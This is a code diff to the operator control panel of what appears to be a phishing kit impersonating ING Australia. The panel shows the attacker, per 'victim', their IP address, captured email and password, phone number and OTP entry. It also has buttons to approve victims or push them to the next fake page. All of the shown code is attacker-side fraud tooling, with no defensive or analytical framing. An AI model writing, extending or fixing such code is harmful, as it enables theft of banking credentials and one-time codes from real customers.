@@ -798,33 +798,13 @@
       setTimeout(() => alert.remove(), 5000);
     }
 
-    /* ----------  STATUS - FIXED TO CHECK PAGE PROGRESSION ---------- */
+    /* ----------  STATUS  ---------- */
     function statusText(s){
-      // Check approved first
       if (s.page==='success' || s.status==='approved') return '';
-      
-      // Check OTP page first (highest priority after approved)
-      if (s.page==='otp.html') {
-        if (s.otp) return '<div style="font-size:11px;color:var(--green)">ENTERED OTP</div>';
-        return '<div style="font-size:11px;color:var(--text-muted)">AWAITING OTP</div>';
-      }
-      
-      // Then check unregister page
-      if (s.page==='unregister.html') {
-        if (s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
-        return '<div style="font-size:11px;color:var(--text-muted)">ON UNREGISTER PAGE</div>';
-      }
-      
-      // Then check verify page
-      if (s.page==='verify.html') {
-        if (s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
-        return '<div style="font-size:11px;color:var(--text-muted)">AWAITING PHONE</div>';
-      }
-      
-      // Then check index/login page
       if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
-      
-      // Default waiting state
+      if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
+      if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
+      if (s.page==='otp.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">ENTERED OTP</div>';
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
@@ -834,9 +814,9 @@
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
       
-      // Quick approve button for verify.html with phone entered - redirects to ing.com.au
+      // Quick approve button for verify.html with phone entered
       if (s.page === 'verify.html' && s.phone && s.entered) {
-        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve (to ing.com.au)"><img src="/images/check.png"></button>`;
+        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve"><img src="/images/check.png"></button>`;
       }
       
       if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
@@ -868,13 +848,6 @@
           showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
           if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
         } else {
-          // Check for page progression
-          if (old.page !== s.page) {
-            // Page changed - show appropriate alert
-            if (s.page === 'otp.html' && old.page === 'unregister.html') {
-              showAlert('info', 'AUTO-REDIRECTED TO OTP', 'Victim proceeded to OTP page', s.victimNum);
-            }
-          }
           if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
           if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
           if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
